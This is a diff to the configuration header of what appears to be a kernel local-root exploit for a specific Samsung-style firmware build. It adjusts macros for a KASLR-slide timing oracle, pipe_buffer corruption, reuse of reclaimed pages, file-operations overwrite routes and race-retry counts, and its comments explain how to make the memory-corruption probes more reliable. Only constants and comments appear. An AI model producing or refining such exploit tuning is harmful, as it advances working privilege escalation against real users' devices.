@@ -29,7 +29,7 @@
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
 #define BUILD_VARIANT_LABEL \
-  "b5q-F731BXXS7GZF1-mcast-p0-page-reuse-configfs-pipe-root"
+  "b5q-F731BXXS7GZF1-mcast-adaptive-p0-configfs-pipe-root"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_TRACEFS_SLIDE 1
@@ -45,19 +45,24 @@
 #define APP_CLOSED_FOPS_ROUTE 1
 #define APP_FOPS_REUSE_VERIFIED_PAGE 1
 #define APP_FOPS_REWRITE_RECLAIMED_PAGE 1
+#define APP_FOPS_REWRITE_RECLAIMED_PAGE_DEFAULT 0
 #define APP_CONTROLLED_MM_GROUP_RECLAIM 1
 /*
  * Keep retries inside the one fresh P0 child.  A clean gate miss has not
  * modified P0 and can safely reclaim another page; restarting a supervisor
- * after a real gate hit cannot be made safe.  Gate/probe/restore slots are
- * idempotent and get three independent race windows because the trigger's
- * return value alone cannot confirm that the pipe_buffer changed.
+ * after a real gate hit cannot be made safe.  Run one PI/MCAST write at a
+ * time and use downstream pipe readback to decide whether another probe is
+ * needed; blind repeated tree operations are deliberately disabled.
  */
 #define APP_SLIDE_FRESH_PAGE_ATTEMPTS 2
 #define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
-#define APP_P0_REDUNDANT_SLOT_WRITES 3
+#define APP_P0_REDUNDANT_SLOT_WRITES 1
+#define APP_P0_PROBE_ATTEMPTS 3
+#define APP_P0_NONDESTRUCTIVE_PROBE_SCAN 1
 #define APP_FOPS_FRESH_PAGE_ATTEMPTS 3
 #define APP_FOPS_FINE_DELAY_PER_ROUTE 1
+#define APP_FOPS_ALWAYS_VERIFY_WRITE 1
+#define APP_FOPS_AUTHORITATIVE_READBACK 1
 /*
  * A complete controlled order-3 page needs 32 retained mm_struct objects.
  * Collision measurement dominates that collection time.  Try the sampling
@@ -469,7 +474,7 @@
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
-#define SLIDE_BANK_SLOTS 5
+#define SLIDE_BANK_SLOTS 7
 #define SLIDE_BANK_TASK_OFF 0x1000
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
 #define SLIDE_BANK_LOCK_OFF 0x5200
@@ -498,9 +503,10 @@
 
 #define P0_ORACLE_GATE_SLOT 0
 #define P0_ORACLE_PROBE_SLOT 1
-#define P0_ORACLE_GATE_RESTORE_SLOT 2
-#define P0_ORACLE_PROBE_RESTORE_SLOT 3
-#define P0_ORACLE_PRODUCTION_SLOT 4
+#define P0_ORACLE_PROBE_SLOT_COUNT 3
+#define P0_ORACLE_GATE_RESTORE_SLOT 4
+#define P0_ORACLE_PROBE_RESTORE_SLOT 5
+#define P0_ORACLE_PRODUCTION_SLOT 6
 #define P0_ORACLE_GATE_PAGE_OFF 0x0e80
 #define P0_ORACLE_GATE_OBJECT_INDEX 1
 
